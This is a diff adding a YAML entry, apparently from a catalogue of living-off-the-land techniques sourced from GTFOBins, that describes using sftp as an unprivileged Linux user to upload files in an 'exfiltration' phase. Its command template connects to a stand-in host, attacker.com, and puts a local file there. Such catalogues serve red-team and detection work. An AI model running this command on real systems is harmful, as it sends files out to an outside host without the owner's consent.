@@ -1,0 +1,25 @@
+id: gtfobins/sftp/upload/unprivileged
+type: binary
+platform: linux
+name: sftp
+phases:
+- exfiltration
+capabilities:
+- file-upload
+privilege_required: user
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: 'sftp user@attacker.com
+
+    put /path/to/input-file /path/to/output-file'
+references:
+- https://gtfobins.github.io/gtfobins/sftp/
+tags:
+- linux
+- unix
+- gtfobins
